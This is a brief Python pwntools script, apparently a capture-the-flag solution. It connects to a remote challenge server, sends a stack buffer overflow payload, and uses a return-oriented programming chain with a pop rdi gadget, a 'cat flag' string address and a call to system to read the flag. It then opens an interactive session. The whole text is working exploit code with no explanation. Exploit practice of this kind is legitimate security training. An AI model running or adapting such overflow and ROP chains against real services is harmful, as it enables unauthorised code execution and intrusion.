from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'

# r = process('./challenge')
r = remote("34.175.151.38" , 2682)
pop_rdi_ret = 0x401393
ret = 0x40101a
catflag =0x40300d
system_main = 0x4011E9

payload = b"a"*0x30+ flat(0x404f00, pop_rdi_ret, catflag, system_main)

r.sendlineafter(b"name? \n",payload)

r.sendlineafter(b"flag! \n",b"a")

r.interactive()